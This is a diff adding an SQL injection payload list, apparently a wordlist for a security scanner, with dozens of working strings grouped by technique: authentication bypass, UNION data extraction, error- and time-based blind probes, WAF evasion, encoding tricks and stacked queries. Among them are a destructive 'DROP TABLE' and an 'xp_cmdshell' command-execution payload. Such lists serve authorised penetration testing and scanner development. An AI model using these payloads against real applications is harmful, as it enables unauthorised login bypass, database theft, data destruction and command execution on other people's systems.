@@ -1,0 +1,89 @@
+# SQL Injection Test Payloads - Enhanced Deep Testing
+# Covers multiple attack vectors with higher detection rate
+
+# ===== BASIC AUTHENTICATION BYPASS =====
+' OR '1'='1
+' OR 1=1--
+admin' --
+' OR 'a'='a
+' OR ''='
+
+# ===== UNION-BASED (Data Extraction) =====
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+
+# ===== ERROR-BASED (Database Detection) =====
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND 1=CAST(@@version AS INT)--
+
+# ===== TIME-BASED BLIND (Slow Response) =====
+' AND SLEEP(5)--
+' WAITFOR DELAY '0:0:5'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+
+# ===== ADVANCED EVASION (WAF Bypass) =====
+'/**/OR/**/1=1--
+' Or 1=1--
+' oR 1=1--
+'+OR+1=1--
+'||'1'='1
+' OR 1=1#
+'/*! OR */ 1=1--
+
+# ===== STACKED QUERIES (Multiple Commands) =====
+'; SELECT SLEEP(5)--
+'; DROP TABLE test--
+'; EXEC xp_cmdshell('dir')--
+
+# ===== NULL-BASED =====
+' OR NULL IS NULL--
+' OR ISNULL(1/0)--
+' AND NULL=NULL--
+
+# ===== BOOLEAN VARIATIONS =====
+' AND 1=2 UNION SELECT null--
+' OR 'x'='x
+') OR ('1'='1
+')) OR (('1'='1
+' AND '1'='1
+
+# ===== BLIND INJECTION TESTS =====
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+
+# ===== DATABASE FUNCTIONS =====
+' OR USER()='root'--
+' OR DATABASE() LIKE '%'--
+' AND @@version LIKE '%'--
+' OR CURRENT_USER()='root'--
+
+# ===== ENCODING TRICKS =====
+%27%20OR%201=1--
+' OR CHAR(65)=CHAR(65)--
+' OR ASCII('A')=65--
+
+# ===== STRING CONCATENATION =====
+' OR 'a'||'b'='ab'--
+' OR CONCAT('a','b')='ab'--
+
+# ===== INFORMATION SCHEMA ATTACKS =====
+' UNION SELECT table_name FROM information_schema.tables--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+
+# ===== SECOND ORDER INJECTION =====
+admin'--
+' AND SUBSTRING(version(),1,1)='5'--
+
+# ===== PARENTHESES BYPASS =====
+') OR (1=1)--
+')) OR ((1=1))--
+') OR ('1'='1
+')OR('1'='1'--
